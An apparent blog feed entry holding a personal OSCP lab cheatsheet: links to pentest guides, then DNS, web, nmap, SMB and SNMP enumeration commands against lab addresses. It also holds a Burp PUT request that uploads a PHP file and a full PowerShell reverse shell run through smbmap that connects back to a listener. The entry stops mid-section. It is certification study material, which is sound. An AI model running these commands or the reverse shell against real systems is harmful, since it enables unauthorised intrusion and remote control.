        <updated>2019-05-25T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/personal-oscpcheatsheet/" type="text/html"/>
        <id>https://johntuyen.com/posts/personal-oscpcheatsheet/</id>
        
        <content type="html">&lt;p&gt;Here is my OSCP cheatsheet that I&#x27;ve made for myself throughout the nightly lab sessions. I know there are plenty of cheatsheets out there and I don&#x27;t think mine is even that great. Although, I still use this cheatsheet regularly and add commands that I frequently used. I hope this will help those who are looking for quick commands or insights on approaching the OSCP lab machines.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;holy-grail-of-guides&quot;&gt;Holy Grail of Guides&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;sushant747.gitbooks.io&#x2F;total-oscp-guide&#x2F;&quot;&gt;https:&#x2F;&#x2F;sushant747.gitbooks.io&#x2F;total-oscp-guide&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;wwong99&#x2F;pentest-notes&#x2F;blob&#x2F;master&#x2F;oscp&#x2F;OSCP-Survival-Guide.md&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;wwong99&#x2F;pentest-notes&#x2F;blob&#x2F;master&#x2F;oscp_:&#x2F;OSCP-Survival-Guide.md&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;guide.offsecnewbie.com&#x2F;general-methodology&quot;&gt;https:&#x2F;&#x2F;guide.offsecnewbie.com&#x2F;general-methodology&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Snifer&#x2F;security-cheatsheets&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;Snifer&#x2F;security-cheatsheets&lt;&#x2F;a&gt; - Cheatsheet for security tools&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;xapax&#x2F;oscp&#x2F;blob&#x2F;master&#x2F;templates&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;xapax&#x2F;oscp&#x2F;blob&#x2F;master&#x2F;templates&lt;&#x2F;a&gt; - Windows&#x2F;Linux templates&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;http:&#x2F;&#x2F;www.fuzzysecurity.com&#x2F;tutorials&#x2F;16.html&quot;&gt;http:&#x2F;&#x2F;www.fuzzysecurity.com&#x2F;tutorials&#x2F;16.html&lt;&#x2F;a&gt; - Windows PrivEsc&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;blog.g0tmi1k.com&#x2F;2011&#x2F;08&#x2F;basic-linux-privilege-escalation&#x2F;&quot;&gt;https:&#x2F;&#x2F;blog.g0tmi1k.com&#x2F;2011&#x2F;08&#x2F;basic-linux-privilege-escalation&#x2F;&lt;&#x2F;a&gt; - Linux PrivEsc&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;guif.re&#x2F;linuxeop&quot;&gt;https:&#x2F;&#x2F;guif.re&#x2F;linuxeop&lt;&#x2F;a&gt; - Linux PrivEsc&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;http:&#x2F;&#x2F;netsec.ws&#x2F;?p=180&quot;&gt;http:&#x2F;&#x2F;netsec.ws&#x2F;?p=180&lt;&#x2F;a&gt; - Windows buffer overflow&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.corelan.be&#x2F;index.php&#x2F;2009&#x2F;07&#x2F;19&#x2F;exploit-writing-tutorial-part-1-stack-based-overflows&#x2F;&quot;&gt;https:&#x2F;&#x2F;www.corelan.be&#x2F;index.php&#x2F;2009&#x2F;07&#x2F;19&#x2F;exploit-writing-tutorial-part-1-stack-based-overflows&#x2F;&lt;&#x2F;a&gt; - Windows buffer overflow&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;justinsteven&#x2F;dostackbufferoverflowgood&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;justinsteven&#x2F;dostackbufferoverflowgood&lt;&#x2F;a&gt; - Windows buffer overflow guide - MUST READ!&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;h2 id=&quot;holy-grail-of-tools-and-lists&quot;&gt;Holy Grail of Tools and Lists&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;SecWiki&#x2F;windows-kernel-exploits&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;SecWiki&#x2F;windows-kernel-exploits&lt;&#x2F;a&gt; - Windows Pre-compiled Kernel Exploits&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;swisskyrepo&#x2F;PayloadsAllTheThings&#x2F;blob&#x2F;master&#x2F;Methodology%20and%20:&#x2F;Windows%20-%20Privilege%20Escalation.md&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;swisskyrepo&#x2F;PayloadsAllTheThings&#x2F;blob&#x2F;master&#x2F;Methodology%20and%20:&#x2F;Windows%20-%20Privilege%20Escalation.md&lt;&#x2F;a&gt; - Windows PrivEsc&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;M4ximuss&#x2F;Powerless&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;M4ximuss&#x2F;Powerless&lt;&#x2F;a&gt; - Windows PrivEsc&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;0x00-0x00&#x2F;ShellPop&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;0x00-0x00&#x2F;ShellPop&lt;&#x2F;a&gt; - Generate easy and sophisticated reverse or bind shell commands to help you during penetration tests&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;gchq&#x2F;CyberChef&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;gchq&#x2F;CyberChef&lt;&#x2F;a&gt; - A web app for encryption, encoding, compression and data analysis &lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Tib3rius&#x2F;AutoRecon&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;Tib3rius&#x2F;AutoRecon&lt;&#x2F;a&gt; - Must have enumeration tool for OSCP&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;bitsadmin&#x2F;wesng&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;bitsadmin&#x2F;wesng&lt;&#x2F;a&gt; - Windows Exploit Suggester&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;infosecn1nja&#x2F;Red-Teaming-Toolkit&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;infosecn1nja&#x2F;Red-Teaming-Toolkit&lt;&#x2F;a&gt; - List of big guns that you don&#x27;t need for OSCP but worth checking out.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;gtfobins.github.io&#x2F;?fbclid=IwAR347a0JfcwvrGCALNupL8vpOyOfQCcAhuhikcs5dMY6mSxw11JpYXsk0dU#+suid&quot;&gt;https:&#x2F;&#x2F;gtfobins.github.io&#x2F;?fbclid=IwAR347a0JfcwvrGCALNupL8vpOyOfQCcAhuhikcs5dMY6mSxw11JpYXsk0dU#+suid&lt;&#x2F;a&gt; - Collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;h2 id=&quot;exploit-chain&quot;&gt;Exploit Chain&lt;&#x2F;h2&gt;
&lt;p&gt;:question: How to find out if I have initial read&#x2F;write access to the system:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Port scan&lt;&#x2F;li&gt;
&lt;li&gt;Connect to the ports via associated tools and see what I can read and&#x2F;or upload or put stuff&lt;&#x2F;li&gt;
&lt;li&gt;Ports that take credentials: try to brute force or try common sets of credentials&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;:question: When do I have to bypass authentication in a web app?&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;If I can&#x27;t get initial read&#x2F;write access to the file system&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;:question: If you have read access to the file system like an LFI or directory tranversal, what do you need to make it a shell?&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;You need write access to the file system or database somewhere else and ability to execute using LFI or directory traversal&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;:question: How do you bypass authentication in a web app?&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Guess the password&lt;&#x2F;li&gt;
&lt;li&gt;Bypass the password by authentication bypass&lt;&#x2F;li&gt;
&lt;li&gt;Exploit the system to generate a new user&lt;&#x2F;li&gt;
&lt;li&gt;If you want higher authentication to do what you need, you look for a privilege escalation&lt;&#x2F;li&gt;
&lt;li&gt;Find credentials in notes that are accessible or in the manual&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;:question: How do you get write access to the file system or database from read-only web app access?&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Scour through the app until you find an LFI or RFI exploit&lt;&#x2F;li&gt;
&lt;li&gt;Scour through the app until you find a place to upload a file&lt;&#x2F;li&gt;
&lt;li&gt;Scour through the app tickets, notes, posts to see if you can find clues or credentials&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;:question: How do out find out if you have read access to the file system or database through unauthenticated access to a web app?&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Use &lt;code&gt;nikto&lt;&#x2F;code&gt; or &lt;code&gt;dirb&lt;&#x2F;code&gt; and go through the pages to see what you can find&lt;&#x2F;li&gt;
&lt;li&gt;Look for directory traversal exploits&lt;&#x2F;li&gt;
&lt;li&gt;Look for LFI&#x2F;RFI exploits&lt;&#x2F;li&gt;
&lt;li&gt;Look for data leakage exploits&lt;&#x2F;li&gt;
&lt;li&gt;Look for credentials in files that are found by &lt;code&gt;nikto&lt;&#x2F;code&gt; or &lt;code&gt;dirb&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;li&gt;Look at the source code in pages that were found in &lt;code&gt;nikto&lt;&#x2F;code&gt; or &lt;code&gt;dirb&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;hr &#x2F;&gt;
&lt;h2 id=&quot;dns-enumeration&quot;&gt;DNS Enumeration&lt;&#x2F;h2&gt;
&lt;p&gt;Zone transfer vulnerability:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;dnsrecon -d zonetransfer.me -t axfr
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;host -t ns zonetransfer.me
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;host -l zonetransfer.me &amp;lt;nameserver&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;host -t mx zonetransfer.me
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;host zonetransfer.me
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;dnsenum zonetransfer.me
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;hr &#x2F;&gt;
&lt;h2 id=&quot;website-enumeration&quot;&gt;Website Enumeration&lt;&#x2F;h2&gt;
&lt;p&gt;Nikto HTTP(s) scanning:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;nikto -h 10.11.1.115:443
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;dirb http:&#x2F;&#x2F;10.11.1.115
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Burp Suite PUT request to create file:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;PUT &#x2F;scripts&#x2F;helloworld.php HTTP&#x2F;1.1
&lt;&#x2F;span&gt;&lt;span&gt;Host: 10.11.1.13
&lt;&#x2F;span&gt;&lt;span&gt;User-Agent: Mozilla&#x2F;5.0 (X11; Linux i686; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0
&lt;&#x2F;span&gt;&lt;span&gt;Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q=0.9,*&#x2F;*;q=0.8
&lt;&#x2F;span&gt;&lt;span&gt;Accept-Language: en-US,en;q=0.5
&lt;&#x2F;span&gt;&lt;span&gt;Accept-Encoding: gzip, deflate
&lt;&#x2F;span&gt;&lt;span&gt;Connection: close
&lt;&#x2F;span&gt;&lt;span&gt;Upgrade-Insecure-Requests: 1
&lt;&#x2F;span&gt;&lt;span&gt;Content-Length: 25
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;?php echo(&amp;quot;Success&amp;quot;); ?&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;ASP IIS enumeration hacking: &lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;maestron&#x2F;hacking-tutorials&#x2F;blob&#x2F;master&#x2F;Guide%20to%20IIS%20Exploitation.txt&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;maestron&#x2F;hacking-tutorials&#x2F;blob&#x2F;master&#x2F;Guide%20to%20IIS%20Exploitation.txt&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;h2 id=&quot;nmap-commands&quot;&gt;Nmap Commands&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;highon.coffee&#x2F;blog&#x2F;nmap-cheat-sheet&#x2F;&quot;&gt;https:&#x2F;&#x2F;highon.coffee&#x2F;blog&#x2F;nmap-cheat-sheet&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Nmap TCP - Quick&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;if [ $# -ne 2 ]; then
&lt;&#x2F;span&gt;&lt;span&gt;    echo &amp;quot;Usage: nmap-tcp-quick.sh &amp;lt;TARGET&amp;gt; &amp;lt;OUTPUT-FILENAME&amp;gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;        exit 1
&lt;&#x2F;span&gt;&lt;span&gt;	fi
&lt;&#x2F;span&gt;&lt;span&gt;	
&lt;&#x2F;span&gt;&lt;span&gt;	nmap -Pn -sS --stats-every 3m --max-retries 1 --max-scan-delay 20 --defeat-rst-ratelimit -T4 -p1-65535 -oA $2 $1
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Nmap TCP - Full&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;if [ &amp;quot;$#&amp;quot; -ne 3 ]; then
&lt;&#x2F;span&gt;&lt;span&gt;	echo &amp;quot;Usage: nmap-tcp-full.sh &amp;lt;TCP-QUICK-RESULTS.XML&amp;gt; &amp;lt;TARGET&amp;gt; &amp;lt;OUTPUT-FILENAME&amp;gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;		exit 1
&lt;&#x2F;span&gt;&lt;span&gt;		fi
&lt;&#x2F;span&gt;&lt;span&gt;		
&lt;&#x2F;span&gt;&lt;span&gt;		nmap -nvv -Pn -sSV -T1 -p$(cat $1 | grep portid | grep protocol=\&amp;quot;tcp\&amp;quot; | cut -d&amp;#39;&amp;quot;&amp;#39; -f4 | paste -sd &amp;quot;,&amp;quot; -) --version-intensity 9 -A
&lt;&#x2F;span&gt;&lt;span&gt;		-oA $3 $2
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;nmap UDP - Quick&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;if [ $# -ne 2 ]; then
&lt;&#x2F;span&gt;&lt;span&gt;    echo &amp;quot;Usage: nmap-udp-quick.sh &amp;lt;TARGET&amp;gt; &amp;lt;OUTPUT-FILENAME&amp;gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;        exit 1
&lt;&#x2F;span&gt;&lt;span&gt;	fi
&lt;&#x2F;span&gt;&lt;span&gt;	
&lt;&#x2F;span&gt;&lt;span&gt;	nmap -Pn --top-ports 1000 -sU --stats-every 3m --max-retries 1 -T3 -oA $2 $1
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;nmap UDP - Full&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;if [ &amp;quot;$#&amp;quot; -ne 3 ]; then
&lt;&#x2F;span&gt;&lt;span&gt;	echo &amp;quot;Usage: nmap-udp-full.sh &amp;lt;UDP-QUICK-RESULTS.XML&amp;gt; &amp;lt;TARGET&amp;gt; &amp;lt;OUTPUT-FILENAME&amp;gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;		exit 1
&lt;&#x2F;span&gt;&lt;span&gt;		fi
&lt;&#x2F;span&gt;&lt;span&gt;		
&lt;&#x2F;span&gt;&lt;span&gt;		nmap -nvv -Pn -sSV -T1 -p$(cat $1 | grep portid | grep protocol=\&amp;quot;udp\&amp;quot; | cut -d&amp;#39;&amp;quot;&amp;#39; -f4 | paste -sd &amp;quot;,&amp;quot; -) --version-intensity 9 -A -oA $3 $2
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;nmap HTTP-put command to check for PUT request:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;nmap -v -p 80 --script=http-put --script-args http-put.url=&amp;#39;&#x2F;mrtg&#x2F;scripts.php&amp;#39;,http-put.file=&amp;#39;.&#x2F;rs.php&amp;#39; 10.11.1.22
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;hr &#x2F;&gt;
&lt;h2 id=&quot;smb-commands&quot;&gt;SMB Commands&lt;&#x2F;h2&gt;
&lt;p&gt;SMB null session enumeration:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;enum4linux -a 10.11.1.115
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;NetBIOS enumeration:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;nmap -v -p 139,445 -oG netbios-smb.log 10.11.1.115
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;nbtscan -r 10.11.1.0&#x2F;24
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Nmap SMB NSE scripts: &#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;nmap -v -p 139,445 --script=smb-os-discovery 10.11.1.115
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.11.1.115
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;nmap -v -p 139,445 --script=smb-vuln* 10.11.1.5
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;nmap -v -p 139,445 --script=smb* 10.11.1.115
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;hr &#x2F;&gt;
&lt;h3 id=&quot;smbclient-commands&quot;&gt;SMBClient commands&lt;&#x2F;h3&gt;
&lt;p&gt;List all SMB share folders:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;smbclient -L 10.11.1.136 -N
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Read shared folder:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;smbclient &#x2F;&#x2F;10.11.1.136&#x2F;Bob\ Share -N
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;If you wanted to download a copy of files&#x2F;folders without prompt and in recursive mode:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;smb:&amp;gt; recurse
&lt;&#x2F;span&gt;&lt;span&gt;smb:&amp;gt; prompt
&lt;&#x2F;span&gt;&lt;span&gt;smb:&amp;gt; mget *
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;hr &#x2F;&gt;
&lt;h3 id=&quot;smbmap-commands&quot;&gt;SMBMap Commands&lt;&#x2F;h3&gt;
&lt;p&gt;https:&#x2F;&#x2F;github.com&#x2F;ShawnDEvans&#x2F;smbmap&lt;&#x2F;p&gt;
&lt;p&gt;Show shares (or null sessions) on the host:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;smbmap -H 10.11.1.223
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Show shares using credentials on the host:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;smbmap -H 10.11.1.223 -d thinc.local -u username -p password
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Command execution using &lt;code&gt;smbmap&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;$ python smbmap.py -u ariley -p &amp;#39;P@$$w0rd1234!&amp;#39; -d ABC -x &amp;#39;net group &amp;quot;Domain Admins&amp;quot; &#x2F;domain&amp;#39; -H 192.168.2.50
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Nifty &lt;code&gt;smbmap&lt;&#x2F;code&gt; reverse shell (make sure you change the IP address):&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;python smbmap.py -u jsmith -p &amp;#39;R33nisP!nckle&amp;#39; -d ABC -H 192.168.2.50 -x &amp;#39;powershell -command &amp;quot;function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=&amp;quot;&amp;quot;&amp;quot;&amp;quot;192.168.0.153&amp;quot;&amp;quot;&amp;quot;&amp;quot;; $port=&amp;quot;&amp;quot;&amp;quot;&amp;quot;4445&amp;quot;&amp;quot;&amp;quot;&amp;quot;;$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=&amp;quot;&amp;quot;&amp;quot;&amp;quot;cmd.exe&amp;quot;&amp;quot;&amp;quot;&amp;quot;  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out=&amp;quot;&amp;quot;&amp;quot;&amp;quot; &amp;quot;&amp;quot;&amp;quot;&amp;quot;}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};&amp;quot;&amp;#39;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;hr &#x2F;&gt;
&lt;h2 id=&quot;snmp-commands&quot;&gt;SNMP Commands&lt;&#x2F;h2&gt;
&lt;p&gt;Scan for open SNMP ports:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;nmap -sU --open -p 161 10.11.1.1-254 -oG snmplog.txt
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Using &lt;code&gt;onesixtyone&lt;&#x2F;code&gt; tool:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;echo public &amp;gt; community
&lt;&#x2F;span&gt;&lt;span&gt;echo private &amp;gt;&amp;gt; community
&lt;&#x2F;span&gt;&lt;span&gt;echo manager &amp;gt;&amp;gt; community
&lt;&#x2F;span&gt;&lt;span&gt;for ip in $(seq 1 254); do echo 10.11.1.$ip; done &amp;gt; iplist
&lt;&#x2F;span&gt;&lt;span&gt;onesixtyone -c community -i iplist
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Using &lt;code&gt;snmpwalk&lt;&#x2F;code&gt; tool to enumerate entire MIB tree: &lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;snmpwalk -c public -v1 10.11.1.219
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Enumerating Windows users:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;snmpwalk -c public -v1 10.11.1.204 1.3.6.1.4.1.77.1.2.25
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Enumerating Windows processes:&lt;&#x2F;p&gt;
